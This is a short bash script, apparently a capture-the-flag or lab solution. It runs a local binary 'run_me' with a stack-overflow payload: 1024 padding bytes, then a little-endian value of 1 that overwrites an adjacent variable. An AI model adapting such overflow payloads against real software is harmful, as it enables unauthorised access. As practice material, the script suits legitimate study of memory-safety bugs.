#!/usr/bin/env bash

./run_me $(python3 -c 'print("1" * 1024 + "\x01\x00\x00\x00")')